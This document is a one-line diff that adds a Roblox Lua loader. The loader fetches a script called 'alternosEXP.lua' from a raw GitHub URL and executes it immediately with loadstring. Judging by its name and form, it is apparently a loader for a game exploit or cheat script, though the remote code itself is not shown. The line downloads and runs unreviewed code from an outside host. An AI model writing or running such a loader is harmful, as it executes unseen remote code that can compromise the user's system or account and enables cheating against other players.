@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ash00016/Alternos-EXP/main/alternosEXP.lua"))()
